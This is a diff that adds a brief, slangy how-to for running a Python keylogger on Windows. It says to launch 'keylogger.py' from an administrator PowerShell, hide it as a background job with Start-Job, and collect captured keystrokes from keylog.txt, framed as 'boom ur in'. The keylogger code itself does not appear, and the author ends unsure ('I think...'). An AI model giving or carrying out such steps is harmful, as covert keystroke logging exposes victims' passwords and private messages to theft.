@@ -1,0 +1,12 @@
+to run ts you wanna implement this code on windows power shell as administrator  
+
+python keylogger.py
+
+then to start the job in the background 
+
+Start-Job { python keylogger.py }
+
+then boom ur in just go to the text files where the key logs will be stored in 
+keylog.txt 
+
+I think...
